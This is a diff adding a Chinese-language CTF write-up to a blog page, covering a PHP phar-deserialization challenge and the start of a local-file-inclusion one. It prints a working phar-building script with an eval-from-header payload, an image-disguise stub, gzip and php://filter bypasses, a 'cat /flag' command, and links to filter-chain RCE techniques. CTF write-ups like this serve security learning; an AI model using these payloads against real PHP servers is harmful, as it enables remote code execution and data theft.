@@ -328,6 +328,7 @@
       </ol>
     </li>
     <li><a href="#pharme"><strong>pharme</strong></a></li>
+    <li><a href="#ezlfi">ezLFI</a></li>
   </ol>
 </nav>
         </div>
@@ -396,7 +397,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 11 分钟
+                    阅读时长: 14 分钟
                 </time>
             </div>
         
@@ -1694,7 +1695,179 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>简单的phar反序列化，以前详细讲过https://luo-kaihong.github.io/p/2025-tgctf-write.up/</p>
+<p>这题思路，显然，先phar反序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">evil</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="o">=</span><span class="s1">&#39;eval(end(getallheaders()));__halt_compiler();&#39;</span><span class="p">;</span> <span class="c1">// 定义cmd属性，值为eval函数和__halt_compiler()函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span> <span class="c1">// 定义析构函数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="s1">&#39;ch3nx1&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/;+/&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ch3nx1&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">,</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[A-Za-z_\(\\)]+/&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">))){</span> <span class="c1">// 使用正则表达式过滤cmd中的字母、下划线、括号等字符，然后替换分号为&#39;ch3nx1&#39;，判断是否等于&#39;ch3nx1&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="o">.</span> <span class="c1">// 如果条件成立，执行cmd命令
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="s1">&#39;isbigvegetablechicken!&#39;</span><span class="p">);</span> <span class="c1">// 在cmd后面添加字符串&#39;isbigvegetablechicken!&#39;，然后执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;nonono&#39;</span><span class="p">;</span> <span class="c1">// 如果条件不成立，输出&#39;nonono&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span><span class="k">new</span> <span class="nx">evil</span><span class="p">();</span> <span class="c1">// 创建evil类的实例$a
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">&#39;1.phar&#39;</span><span class="p">);</span> <span class="c1"># 生成名为1.phar的Phar文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span> <span class="c1"># 停止缓冲，直接写入文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">&#39;GIF89a&#39;</span> <span class="o">.</span> <span class="s1">&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;</span><span class="p">);</span> <span class="c1"># 设置stub，以GIF89a开头，后面跟着__HALT_COMPILER()，使Phar文件看起来像图片文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span> <span class="c1"># 将$a作为元数据写入Phar文件，用于反序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">&#39;1.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">);</span> <span class="c1"># 向Phar文件添加内容为&#39;1&#39;的1.txt文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span> <span class="c1"># 再次停止缓冲，确保所有内容都已写入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
+</div><p>来解释一下这个代码特殊之处，这个源码显然是告诉我们只能含有字母A-Z，a-z，下划线_和左右括号()，其实也就是无参RCE，那就打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(end(getallheaders()));
+</span></span><span class="line"><span class="cl">请求头最后一行:system(&#39;cat /flag&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://xz.aliyun.com/news/5922"  target="_blank" rel="noopener"
+    >ByteCTF一道题的分析与学习PHP无参数函数的利用-先知社区</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">然后为了注释&#39;isbigvegetablechicken!&#39;，用__halt_compiler();（eval中的字符串是拼接的，且不能用#和//进行注释）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>环境配置分享的第一篇文章有讲，然后生成phar文件，测试发现只能上传图片，改后缀发现报错</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">!preg_match(“/__HALT_COMPILER/i”,FILE_CONTENTS)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说明还是发现是phar文件，所以gzip压缩一下（<strong>liunx环境执行</strong>）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gzip 1.phar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后改后缀为1.png上传得到路径<code>/tmp/4a47a0db6e60853dedfcfdf08a5ca249.png</code></p>
+<p>然后绕过掉phar://开头的正则，本来想打compress.zlib绕过，后面了解是要开启zip拓展才有的，这里用不了</p>
+<p><a class="link" href="https://xz.aliyun.com/news/6303"  target="_blank" rel="noopener"
+    >php反序列化拓展攻击详解&ndash;phar-先知社区</a></p>
+<p>所以就用伪协议打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file=php://filter/resource=phar:///tmp/4a47a0db6e60853dedfcfdf08a5ca249.png
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>抓包后就在请求头最后执行命令就好了</p>
+<img src="image-20250419000345539.png" alt="image-20250419000345539" style="zoom:50%;" />
+<p>这题考的挺多知识点：</p>
+<p><strong>phar反序列化+无参rce+__halt_compiler来终止编译+gzip压缩绕过phar文件检测+伪协议绕过phar头检测</strong></p>
+<h2 id="ezlfi">ezLFI
+</h2><p>题目附件有index.php源码就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">include_once</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>读附件给的docker-entrypoint.sh  发现<code>chmod 400 /flag  # 设置只读权限</code>,但是发现/readflag可以执行，然后其执行可以读取flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">rm</span> <span class="o">-</span><span class="nx">f</span> <span class="o">/</span><span class="nx">docker</span><span class="o">-</span><span class="nx">entrypoint</span><span class="o">.</span><span class="nx">sh</span>                <span class="c1"># 清理默认Docker入口脚本
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">user</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="nx">ls</span> <span class="o">/</span><span class="nx">home</span><span class="p">)</span>                          <span class="c1"># 获取/home目录用户列表（ls解析存在风险）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">INSERT_FLAG</span><span class="o">=</span><span class="s2">&#34;flag{TEST_FLAG}&#34;</span>             <span class="c1"># 定义预设flag值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$INSERT_FLAG</span> <span class="o">|</span> <span class="nx">tee</span> <span class="o">/</span><span class="nx">flag</span>             <span class="c1"># 写入flag到系统根目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">chmod</span> <span class="mi">400</span> <span class="o">/</span><span class="nx">flag</span>                           <span class="c1"># 设置只读权限（400=rw-------）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">cd</span> <span class="o">/</span><span class="nx">build</span>                                 <span class="c1"># 进入编译目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">musl</span><span class="o">-</span><span class="nx">gcc</span> <span class="o">-</span><span class="nx">s</span> <span class="o">-</span><span class="nx">oreadflag</span> <span class="o">-</span><span class="nx">Os</span> <span class="o">-</span><span class="k">static</span> <span class="nx">readflag</span><span class="o">.</span><span class="nx">c</span>  <span class="c1"># 静态编译可执行文件（-s去符号表，-Os优化体积）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">cp</span> <span class="o">/</span><span class="nx">build</span><span class="o">/</span><span class="nx">readflag</span> <span class="o">/</span>                      <span class="c1"># 部署到根目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">chmod</span> <span class="nx">u</span><span class="o">=</span><span class="nx">srx</span><span class="p">,</span><span class="nx">g</span><span class="o">=</span><span class="nx">rx</span><span class="p">,</span><span class="nx">o</span><span class="o">=</span><span class="nx">x</span> <span class="o">/</span><span class="nx">readflag</span>            <span class="c1"># 设置SUID权限（s=提权，rx=可读执行）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">init</span><span class="o">.</span><span class="nx">d</span><span class="o">/</span><span class="nx">php7</span><span class="o">.</span><span class="mi">4</span><span class="o">-</span><span class="nx">fpm</span> <span class="nx">start</span> <span class="nx">\</span>            <span class="c1"># 启动PHP-FPM服务
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="o">&amp;&amp;</span> <span class="nx">nginx</span> <span class="o">-</span><span class="nx">g</span> <span class="s1">&#39;daemon off;&#39;</span>                <span class="c1"># 前台启动Nginx（&amp;&amp;确保顺序执行）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">tail</span> <span class="o">-</span><span class="nx">f</span> <span class="o">/</span><span class="nx">dev</span><span class="o">/</span><span class="k">null</span>                         <span class="c1"># 保持容器存活（阻塞进程防退出）
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以这里显然这里是文件包含执行命令，那就是用就是filterChain。具体看</p>
+<p><a class="link" href="https://cloud.tencent.com/developer/article/2287108?areaId=106001"  target="_blank" rel="noopener"
+    >利用filter过滤器的编码组合构造RCE-腾讯云开发者社区-腾讯云</a></p>
+<p><a class="link" href="https://www.ctfiot.com/22057.html"  target="_blank" rel="noopener"
+    >php://filter特性包含任意文件getshell | CTF导航</a></p>
+<p><a class="link" href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"  target="_blank" rel="noopener"
+    >https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</a></p>
+
 </section>
 
 
